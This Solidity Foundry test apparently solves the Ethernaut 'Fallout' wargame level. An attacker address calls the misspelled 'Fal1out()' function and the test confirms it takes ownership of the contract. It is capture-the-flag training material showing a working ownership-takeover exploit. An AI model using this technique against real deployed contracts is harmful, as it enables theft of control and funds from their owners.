// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "src/Fallout.sol";


contract FalloutTest is Test {
    Fallout private fl;
    address private constant HACKER = address(0x1);
    function setUp() external {
        fl = new Fallout();
        vm.deal(HACKER, 1e18);
        vm.startPrank(HACKER);
    }

    function testHack() external {
        (bool success,) = address(fl).call{value: 1}(abi.encodeWithSignature("Fal1out()"));
        require(success, "tx failed");
        assertEq(fl.owner(), HACKER);
        vm.stopPrank();
    }
}